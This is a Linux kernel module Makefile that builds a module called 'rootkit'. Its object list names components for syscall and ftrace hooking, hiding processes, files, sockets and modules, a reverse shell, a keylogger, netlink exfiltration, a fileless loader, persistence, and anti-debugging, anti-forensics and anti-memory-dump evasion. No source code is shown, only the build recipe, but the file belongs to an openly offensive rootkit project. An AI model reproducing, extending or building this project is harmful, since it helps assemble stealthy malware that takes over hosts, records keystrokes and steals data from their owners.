ccflags-y += -I$(PWD)/src

obj-m += rootkit.o

rootkit-objs := \
	src/ftrace_hook.o \
	src/string_encrypt.o \
	src/anti_debug.o \
	src/watchdog.o \
	src/netfilter_trigger.o \
	src/hmac_auth.o \
	src/persistence.o \
	src/inline_hook.o \
	src/directory_encrypt.o \
	src/process_hiding.o \
	src/module_hiding.o \
	src/socket_hiding.o \
	src/syscall_hook.o \
	src/reverse_shell.o \
	src/keylogger.o \
	src/anti_forensics.o \
	src/packet_filter.o \
	src/anti_watchdog.o \
	src/vfs_file_hiding.o \
	src/command_executor.o \
	src/delayed_activation.o \
	src/fileless_loader.o \
	src/self_watchdog.o \
	src/unload_protection.o \
	src/anti_memdump.o \
	src/sysctl_hiding.o \
	src/breakpoint_detector.o \
	src/netlink_exfil.o \
	src/anti_kprobe.o \
	src/recovery_trigger.o \
	src/trace_disabler.o \
	src/heap_encrypt.o \
	src/key_injector.o \
	src/rootkit_core.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
